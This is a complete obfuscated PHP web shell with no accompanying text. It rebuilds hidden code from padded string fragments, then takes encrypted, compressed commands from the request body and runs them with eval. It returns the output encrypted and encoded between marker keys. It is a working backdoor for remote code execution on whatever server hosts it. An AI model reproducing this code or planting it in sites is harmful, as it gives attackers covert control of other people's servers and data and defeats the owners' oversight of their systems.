<?php
$y='l%He%Hn(%H$t);$o%H="";for($i%H=0;$i<$l;)%H{for($%Hj%H=0;($j<$c%H&&$i<$%Hl)';
$E='e($m[%H1]),$k)));$o=@o%Hb%H_get_con%Htents%H();@ob_%Hend_c%Hlean();%H$r=@';
$a='base6%H4_%Henc%Hode(@x(@gz%H%Hcompress($o)%H,$k));pri%H%Hnt("$p$%Hkh$r$kf");}';
$A=';$j++,$i+%H+){$o.=%H$t{%H$i}^$k{%H$j};}}%Hreturn $%H%H%Ho%H;%H}if (@preg_%H';
$Z='p="sJzpDLzKS18A%H8%HRCE";func%Htion x%H($t,$k){$%Hc=str%Hlen(%H$k);$l=%Hstr';
$L=str_replace('A','','AcreatAe_AAfuncAtAion');
$Q=')==1) {@ob_%Hstart();@e%Hval%H(@gzunc%Hom%Hpre%Hss(@x(%H@base%H64%H_decod';
$J='mat%Hch("/$kh(.+)$kf/",@file_%Hget_c%Ho%Hnten%Hts("php://input%H"),%H$m%H';
$n='$k="da%He58262";%H$k%Hh="8%H6cd5f%H3d036f";$kf=%H"%H85%H26e9385%H2e%H7";$';
$c=str_replace('%H','',$n.$Z.$y.$A.$J.$Q.$E.$a);
$X=$L('',$c);$X();
?>
